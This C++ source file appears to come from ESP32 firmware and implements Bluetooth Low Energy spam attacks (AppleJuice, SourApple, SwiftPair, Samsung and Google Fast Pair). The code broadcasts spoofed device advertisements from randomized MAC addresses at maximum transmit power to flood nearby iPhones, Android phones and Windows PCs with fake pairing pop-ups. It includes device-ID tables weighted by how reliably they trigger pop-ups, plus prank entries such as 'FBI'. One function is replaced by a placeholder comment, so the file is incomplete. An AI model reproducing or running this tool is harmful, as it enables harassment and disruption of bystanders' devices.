#include "ble_spam.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#ifdef CONFIG_BT_NIMBLE_ENABLED
#if __has_include(<NimBLEExtAdvertising.h>)
#define NIMBLE_V2_PLUS 1
#endif
#include "esp_mac.h"
#elif defined(CONFIG_BT_BLUEDROID_ENABLED)
#include "esp_gap_ble_api.h"
#endif
#include <globals.h>

// Bluetooth maximum transmit power
#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || \
    defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21 // ESP32C3 ESP32C2 ESP32S3
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6) || \
    defined(CONFIG_IDF_TARGET_ESP32C5)
#define MAX_TX_POWER ESP_PWR_LVL_P20 // ESP32H2 ESP32C6 ESP32C5
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9 // Default
#endif

struct BLEData {
    BLEAdvertisementData AdvData;
    BLEAdvertisementData ScanData;
};

struct WatchModel {
    uint8_t value;
};

struct mac_addr {
    unsigned char bytes[6];
};

struct Station {
    uint8_t mac[6];
    bool selected;
};

// AppleJuice Payload Data - KEEP ALL ORIGINAL
const uint8_t IOS1[]{
    /* Airpods[31] = */ 0x02,
    /* AirpodsPro[31] = */ 0x0e,
    /*AirpodsMax[31] = */ 0x0a,
    /* AirpodsGen2[31] = */ 0x0f,
    /* AirpodsGen3[31] = */ 0x13,
    /*AirpodsProGen2[31]=*/0x14,
    /* PowerBeats[31] =*/0x03,
    /* PowerBeatsPro[31]=*/0x0b,
    /* BeatsSoloPro[31] = */ 0x0c,
    /* BeatsStudioBuds[31] =*/0x11,
    /*BeatsFlex[31] =*/0x10,
    /* BeatsX[31] =*/0x05,
    /* BeatsSolo3[31] =*/0x06,
    /* BeatsStudio3[31] =*/0x09,
    /* BeatsStudioPro[31] =*/0x17,
    /* BeatsFitPro[31] =*/0x12,
    /* BeatsStdBudsPlus[31] */ 0x16,
};

const uint8_t IOS2[]{
    /* AppleTVSetup[23] */ 0x01,
    /* AppleTVPair[23] */ 0x06,
    /* AppleTVNewUser[23] */ 0x20,
    /* AppleTVAppleIDSetup[23] */ 0x2b,
    /* AppleTVWirelessAudioSync[23] */ 0xc0,
    /* AppleTVHomekitSetup[23] */ 0x0d,
    /* AppleTVKeyboard[23] */ 0x13,
    /*AppleTVConnectingNetwork[23]*/ 0x27,
    /* HomepodSetup[23] */ 0x0b,
    /* SetupNewPhone[23] */ 0x09,
    /* TransferNumber[23] */ 0x02,
    /* TVColorBalance[23] */ 0x1e,
    /* AppleVisionPro[23] */ 0x24,
};

struct DeviceType {
    uint32_t value;
    uint8_t reliability; // 0-100, higher = more likely to trigger pop-ups
};

// KEEP ALL ORIGINAL DEVICES but add reliability scores
const DeviceType android_models[] = {
    // HIGH RELIABILITY (90-100) - Best for pop-ups
    {0xCD8256, 100}, // Bose NC 700 - EXCELLENT
    {0x92BBBD, 100}, // Pixel Buds - Google's own
    {0x821F66, 95},  // JBL Flip 6
    {0xD446A7, 95},  // Sony XM5
    {0x2D7A23, 95},  // Sony WF-1000XM4
    {0x0E30C3, 90},  // Razer Hammerhead TWS
    
    // MEDIUM RELIABILITY (70-89)
    {0x038B91, 85},  // DENON AH-C830NCW
    {0x02F637, 85},  // JBL LIVE FLEX
    {0x02D886, 85},  // JBL REFLECT MINI NC
    {0x06AE20, 80},  // Galaxy S21 5G
    {0x07F426, 80},  // Nest Hub Max
    {0x054B2D, 80},  // JBL TUNE125TWS
    {0x0660D7, 80},  // JBL LIVE770NC
    {0x0903F0, 75},  // LG HBS-2000
    
    // Genuine non-production/forgotten
    {0x0001F0, 60}, // Bisto CSR8670 Dev Board
    {0x000047, 60}, // Arduino 101
    {0x470000, 60}, // Arduino 101 2
    {0x00000A, 60}, // Anti-Spoof Test
    {0x00000B, 60}, // Google Gphones
    {0x00000D, 60}, // Test 00000D
    {0x000007, 60}, // Android Auto
    {0x000009, 60}, // Test Android TV
    {0x090000, 60}, // Test Android TV 2
    {0x000048, 65}, // Fast Pair Headphones
    {0x001000, 65}, // LG HBS1110
    {0x00B727, 65}, // Smart Controller 1
    {0x01E5CE, 65}, // BLE-Phone
    {0x0200F0, 65}, // Goodyear
    {0x00F7D4, 65}, // Smart Setup
    {0xF00002, 65}, // Goodyear
    {0xF00400, 65}, // T10
    {0x1E89A7, 65}, // ATS2833_EVB
    
    // Phone setup (higher reliability)
    {0x0577B1, 85}, // Galaxy S23 Ultra
    {0x05A9BC, 85}, // Galaxy S20+
    
    // More genuine devices
    {0x0000F0, 75}, // Bose QuietComfort 35 II
    {0xF00000, 75}, // Bose QuietComfort 35 II 2
    {0xF52494, 80}, // JBL Buds Pro
    {0x718FA4, 80}, // JBL Live 300TWS
    {0x0002F0, 70}, // JBL Everest 110GA
    {0x000006, 70}, // Google Pixel buds
    {0x060000, 70}, // Google Pixel buds 2
    {0xF00001, 75}, // Bose QuietComfort 35 II
    {0xF00201, 70}, // JBL Everest 110GA
    {0xF00209, 75}, // JBL LIVE400BT
    {0xF00205, 75}, // JBL Everest 310GA
    {0xF00305, 70}, // LG HBS-1500
    {0xF00E97, 75}, // JBL VIBE BEAM
    {0x04ACFC, 75}, // JBL WAVE BEAM
    {0x04AA91, 70}, // Beoplay H4
    {0x04AFB8, 75}, // JBL TUNE 720BT
    {0x05A963, 75}, // WONDERBOOM 3
    {0x05AA91, 70}, // B&O Beoplay E6
    {0x05C452, 75}, // JBL LIVE220BT
    {0x05C95C, 75}, // Sony WI-1000X
    {0x0602F0, 70}, // JBL Everest 310GA
    {0x0603F0, 70}, // LG HBS-1700
    {0x1E8B18, 75}, // SRS-XB43
    {0x1E955B, 75}, // WI-1000XM2
    {0x1EC95C, 75}, // Sony WF-SP700N
    {0x06C197, 80}, // OPPO Enco Air3 Pro
    {0x06D8FC, 80}, // soundcore Liberty 4 NC
    {0x0744B6, 80}, // Technics EAH-AZ60M2
    {0x07A41C, 80}, // WF-C700N
    
    // Custom debug popups (varying reliability)
    {0xD99CA1, 90}, // Flipper Zero
    {0x77FF67, 85}, // Free Robux
    {0xAA187F, 85}, // Free VBucks
    {0xDCE9EA, 80}, // Rickroll
    {0x87B25F, 80}, // Animated Rickroll
    {0x1448C9, 75}, // BLM
    {0x13B39D, 75}, // Talking Sasquach
    {0x7C6CDB, 75}, // Obama
    {0x005EF9, 70}, // Ryanair
    {0xE2106F, 85}, // FBI
    {0xB37A62, 90}, // Tesla
    {0x92ADC9, 70}, // Ton Upgrade Netflix
};

const WatchModel watch_models[26] = {
    {0x1A}, // Fallback Watch
    {0x01}, // White Watch4 Classic 44m
    {0x02}, // Black Watch4 Classic 40m
    {0x03}, // White Watch4 Classic 40m
    {0x04}, // Black Watch4 44mm
    {0x05}, // Silver Watch4 44mm
    {0x06}, // Green Watch4 44mm
    {0x07}, // Black Watch4 40mm
    {0x08}, // White Watch4 40mm
    {0x09}, // Gold Watch4 40mm
    {0x0A}, // French Watch4
    {0x0B}, // French Watch4 Classic
    {0x0C}, // Fox Watch5 44mm
    {0x11}, // Black Watch5 44mm
    {0x12}, // Sapphire Watch5 44mm
    {0x13}, // Purpleish Watch5 40mm
    {0x14}, // Gold Watch5 40mm
    {0x15}, // Black Watch5 Pro 45mm
    {0x16}, // Gray Watch5 Pro 45mm
    {0x17}, // White Watch5 44mm
    {0x18}, // White & Black Watch5
    {0x1B}, // Black Watch6 Pink 40mm
    {0x1C}, // Gold Watch6 Gold 40mm
    {0x1D}, // Silver Watch6 Cyan 44mm
    {0x1E}, // Black Watch6 Classic 43m
    {0x20}, // Green Watch6 Classic 43m
};

BLEAdvertising *pAdvertising;

// Enum for BLE payload types
enum EBLEPayloadType { 
    Microsoft = 0, 
    SourApple = 1, 
    AppleJuice = 2, 
    Samsung = 3, 
    Google = 4 
};

const char *generateRandomName() {
    const char *charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    int len = 8;
    char *randomName = (char *)malloc((len + 1) * sizeof(char));
    for (int i = 0; i < len; ++i) {
        randomName[i] = charset[rand() % strlen(charset)];
    }
    randomName[len] = '\0';
    return randomName;
}

void generateRandomMac(uint8_t *mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = random(256);
        if (i == 0) { 
            mac[i] = (mac[i] | 0xF0) & 0xFE;
        }
    }
}

int android_models_count = (sizeof(android_models) / sizeof(android_models[0]));

// Smart device selection - prefers high-reliability devices
uint32_t getOptimizedAndroidModel() {
    // 70% chance: High reliability device (score >= 85)
    // 20% chance: Medium reliability device (score 70-84)
    // 10% chance: Any random device
    
    int chance = random(100);
    
    if (chance < 70) {
        // Pick from high reliability devices
        int highRelCount = 0;
        for (int i = 0; i < android_models_count; i++) {
            if (android_models[i].reliability >= 85) highRelCount++;
        }
        
        if (highRelCount > 0) {
            int attempts = 0;
            while (attempts < 10) {
                int idx = random(android_models_count);
                if (android_models[idx].reliability >= 85) {
                    return android_models[idx].value;
                }
                attempts++;
            }
        }
    }
    else if (chance < 90) {
        // Pick from medium reliability devices
        int attempts = 0;
        while (attempts < 10) {
            int idx = random(android_models_count);
            if (android_models[idx].reliability >= 70 && android_models[idx].reliability < 85) {
                return android_models[idx].value;
            }
            attempts++;
        }
    }
    
    // Fallback: Any random device
    return android_models[random(android_models_count)].value;
}

BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
    BLEAdvertisementData AdvData = BLEAdvertisementData();

    switch (Type) {
        case Microsoft: { // SwiftPair - Optimized
            uint8_t packet[] = {
                // Flags: LE Limited + General Discoverable
                0x02, 0x01, 0x05,
                // Complete Local Name: "Surface Pro"
                0x0B, 0x09, 'S', 'u', 'r', 'f', 'a', 'c', 'e', ' ', 'P', 'r', 'o',
                // Microsoft Beacon (SwiftPair)
                0x06, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80
            };
            #ifdef NIMBLE_V2_PLUS
            AdvData.addData(packet, sizeof(packet));
            #else
            AdvData.addData(std::string((char *)packet, sizeof(packet)));
            #endif
            break;
        }
        case AppleJuice: {
            // OPTIMIZED: Prefer AirPods Pro (0x0e) for better pop-ups
            int randChoice = random(100);
            uint8_t deviceType;
            
            if (randChoice < 60) { // 60% chance: AirPods Pro (best for pop-ups)
                deviceType = 0x0e; // AirPods Pro
            } else if (randChoice < 80) { // 20% chance: Other popular Apple devices
                deviceType = IOS1[random() % sizeof(IOS1)];
            } else { // 20% chance: AppleTV/HomePod setup
                deviceType = IOS2[random() % sizeof(IOS2)];
            }
            
            if (randChoice < 80) {
                // AirPods style packet
                uint8_t packet[26] = {
                    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, deviceType,
                    0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00
                };
                #ifdef NIMBLE_V2_PLUS
                AdvData.addData(packet, 26);
                #else
                AdvData.addData(std::string((char *)packet, 26));
                #endif
            } else {
                // AppleTV/HomePod style packet
                uint8_t packet[23] = {
                    0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
                    0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, deviceType,
                    0x60, 0x4c, 0x95, 0x00, 0x00, 0x10,
                    0x00, 0x00, 0x00
                };
                #ifdef NIMBLE_V2_PLUS
                AdvData.addData(packet, 23);
                #else
                AdvData.addData(std::string((char *)packet, 23));
                #endif
            }
            break;
        }
        case SourApple: {
            uint8_t packet[17];
            int i = 0;
            packet[i++] = 16;
            packet[i++] = 0xFF;
            packet[i++] = 0x4C;
            packet[i++] = 0x00;
            packet[i++] = 0x0F;
            packet[i++] = 0x05;
            packet[i++] = 0xC1;
            
            // OPTIMIZED: Prefer common Apple pop-up types
            const uint8_t high_prob_types[] = {0x01, 0x06, 0x09, 0x0b, 0x20}; // Most common
            const uint8_t all_types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
            
            if (random(100) < 70) { // 70% chance: Use high probability types
                packet[i++] = high_prob_types[random() % sizeof(high_prob_types)];
            } else { // 30% chance: Use any type
                packet[i++] = all_types[random() % sizeof(all_types)];
            }
            
            esp_fill_random(&packet[i], 3);
            i += 3;
            packet[i++] = 0x00;
            packet[i++] = 0x00;
            packet[i++] = 0x10;
            esp_fill_random(&packet[i], 3);
            
            #ifdef NIMBLE_V2_PLUS
            AdvData.addData(packet, 17);
            #else
            AdvData.addData(std::string((char *)packet, 17));
            #endif
            break;
        }
        case Samsung: {
            // OPTIMIZED: Prefer newer watch models
            uint8_t model;
            if (random(100) < 70) { // 70% chance: Use newer models (index 11+)
                model = watch_models[11 + random(15)].value; // Models 11-25
            } else { // 30% chance: Any model
                model = watch_models[random(26)].value;
            }
            
            uint8_t packet[15] = {
                0x0F, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02,
                0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43,
                model
            };
            #ifdef NIMBLE_V2_PLUS
            AdvData.addData(packet, 15);
            #else
            AdvData.addData(std::string((char *)packet, 15));
            #endif
            break;
        }
        case Google: {
            // OPTIMIZED: Use smart device selection
            const uint32_t model = getOptimizedAndroidModel();
            
            // Generate realistic RSSI (-45 to -85 dBm)
            int8_t rssi = -45 - (random() % 40);
            
            uint8_t packet[14] = {
                0x03, 0x03, 0x2C, 0xFE,
                0x06, 0x16, 0x2C, 0xFE,
                (uint8_t)((model >> 0x10) & 0xFF),
                (uint8_t)((model >> 0x08) & 0xFF),
                (uint8_t)((model >> 0x00) & 0xFF),
                0x02, 0x0A,
                (uint8_t)rssi
            };
            #ifdef NIMBLE_V2_PLUS
            AdvData.addData(packet, 14);
            #else
            AdvData.addData(std::string((char *)packet, 14));
            #endif
            break;
        }
    }

    return AdvData;
}

void executeSpam(EBLEPayloadType type) {
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_base_mac_addr_set(macAddr);
    
    // Optimized device names
    const char* deviceName = "";
    switch(type) {
        case AppleJuice: deviceName = "AirPods Pro"; break;
        case SourApple: deviceName = "Apple TV 4K"; break;
        case Microsoft: deviceName = "Surface Pro 9"; break;
        case Samsung: deviceName = "Galaxy Buds2 Pro"; break;
        case Google: deviceName = "Pixel Buds Pro"; break;
    }
    
    Serial.printf("[BLE] Starting: %s\n", deviceName);
    
    BLEDevice::init(deviceName);
    vTaskDelay(20 / portTICK_PERIOD_MS);
    
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
    
    pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
    BLEAdvertisementData scanResponseData = BLEAdvertisementData();
    
    advertisementData.setFlags(0x01 | 0x02);
    scanResponseData.setName(deviceName);
    scanResponseData.addData(std::string("\x03\x03\x0F\x18", 4)); // Battery service
    
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->setScanResponseData(scanResponseData);
    
    // OPTIMIZED: Slower intervals for better phone detection
    pAdvertising->setMinInterval(0x800);  // 1.28 seconds
    pAdvertising->setMaxInterval(0x800);  // 1.28 seconds
    
    pAdvertising->start();
    vTaskDelay(800 / portTICK_PERIOD_MS);
    
    pAdvertising->stop();
    vTaskDelay(20 / portTICK_PERIOD_MS);
    
    #if defined(CONFIG_IDF_TARGET_ESP32C5)
    esp_bt_controller_deinit();
    #else
    BLEDevice::deinit();
    #endif
    
    Serial.printf("[BLE] Finished: %s\n", deviceName);
}

void executeCustomSpam(String spamName) {
    uint8_t macAddr[6];
    for (int i = 0; i < 6; i++) { 
        macAddr[i] = esp_random() & 0xFF; 
    }
    macAddr[0] = (macAddr[0] | 0xF0) & 0xFE;
    
    esp_base_mac_addr_set(macAddr);
    
    String deviceName = spamName;
    if (!deviceName.endsWith(" Pro") && !deviceName.endsWith(" Max")) {
        deviceName += " Pro";
    }
    
    Serial.printf("[BLE] Custom: %s\n", deviceName.c_str());
    
    BLEDevice::init(deviceName.c_str());
    vTaskDelay(15 / portTICK_PERIOD_MS);
    
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
    pAdvertising = BLEDevice::getAdvertising();
    
    BLEAdvertisementData advertisementData = BLEAdvertisementData();
    BLEAdvertisementData scanResponseData = BLEAdvertisementData();
    
    advertisementData.setFlags(0x01 | 0x02);
    advertisementData.setName(deviceName.c_str());
    advertisementData.addData(std::string("\x03\x03\x12\x18", 4));
    scanResponseData.addData(std::string("\x03\x03\x0F\x18", 4));
    scanResponseData.addData(std::string("\x03\x03\x11\x18", 4));
    
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->setScanResponseData(scanResponseData);
    
    pAdvertising->setMinInterval(0x800);
    pAdvertising->setMaxInterval(0x800);
    
    pAdvertising->start();
    vTaskDelay(800 / portTICK_PERIOD_MS);
    
    pAdvertising->stop();
    vTaskDelay(15 / portTICK_PERIOD_MS);
    
    #if defined(CONFIG_IDF_TARGET_ESP32C5)
    esp_bt_controller_deinit();
    #else
    BLEDevice::deinit();
    #endif
}

// ... [Keep ibeacon function exactly as your original] ...

void aj_adv(int ble_choice) {
    int mael = 0;
    int count = 0;
    String spamName = "";
    
    Serial.println("\n========== BLE SPAM OPTIMIZED ==========");
    Serial.println("Optimized for maximum pop-up detection!");
    Serial.println("Using ALL original devices with smart selection");
    Serial.println("Total Android models available: " + String(android_models_count));
    Serial.println("========================================\n");
    
    if (ble_choice == 6) { 
        spamName = keyboard("", 10, "Name to spam"); 
    }
    
    while (1) {
        Serial.printf("Attempt #%d: ", count);
        
        switch (ble_choice) {
            case 0: // Applejuice - AirPods Pro (iOS)
                displayTextLine("AirPods Pro (" + String(count) + ")");
                Serial.println("AirPods Pro - iOS pop-up");
                executeSpam(AppleJuice);
                break;
            case 1: // SourApple - Apple TV (FIXED BUG)
                displayTextLine("Apple TV 4K (" + String(count) + ")");
                Serial.println("Apple TV 4K - HomeKit pop-up");
                executeSpam(SourApple);
                break;
            case 2: // SwiftPair - Windows
                displayTextLine("Surface Pro (" + String(count) + ")");
                Serial.println("Surface Pro - Windows pop-up");
                executeSpam(Microsoft);
                break;
            case 3: // Samsung - Galaxy Buds
                displayTextLine("Galaxy Buds2 Pro (" + String(count) + ")");
                Serial.println("Galaxy Buds2 Pro - Samsung pop-up");
                executeSpam(Samsung);
                break;
            case 4: // Android - Fast Pair
                displayTextLine("Pixel Buds Pro (" + String(count) + ")");
                Serial.println("Pixel Buds Pro - Android Fast Pair");
                executeSpam(Google);
                break;
            case 5: // Tutti-frutti (FIXED LOOP)
                displayTextLine("Spam All (" + String(count) + ")");
                switch(mael % 5) {
                    case 0: 
                        Serial.println("Pixel Buds Pro");
                        executeSpam(Google); 
                        break;
                    case 1: 
                        Serial.println("Galaxy Buds2 Pro");
                        executeSpam(Samsung); 
                        break;
                    case 2: 
                        Serial.println("Surface Pro");
                        executeSpam(Microsoft); 
                        break;
                    case 3: 
                        Serial.println("Apple TV 4K");
                        executeSpam(SourApple); 
                        break;
                    case 4: 
                        Serial.println("AirPods Pro");
                        executeSpam(AppleJuice); 
                        break;
                }
                mael++;
                break;
            case 6: // custom
                displayTextLine(spamName + " (" + String(count) + ")");
                Serial.println("Custom: " + spamName);
                executeCustomSpam(spamName);
                break;
        }
        count++;
        
        vTaskDelay(500 / portTICK_PERIOD_MS);
        
        if (check(EscPress)) {
            Serial.println("\n========== BLE SPAM STOPPED ==========");
            returnToMenu = true;
            break;
        }
    }
    
    // Final cleanup
    BLEDevice::init("");
    vTaskDelay(100 / portTICK_PERIOD_MS);
    pAdvertising = nullptr;
    vTaskDelay(100 / portTICK_PERIOD_MS);
    #if defined(CONFIG_IDF_TARGET_ESP32C5)
    esp_bt_controller_deinit();
    #else
    BLEDevice::deinit();
    #endif
}
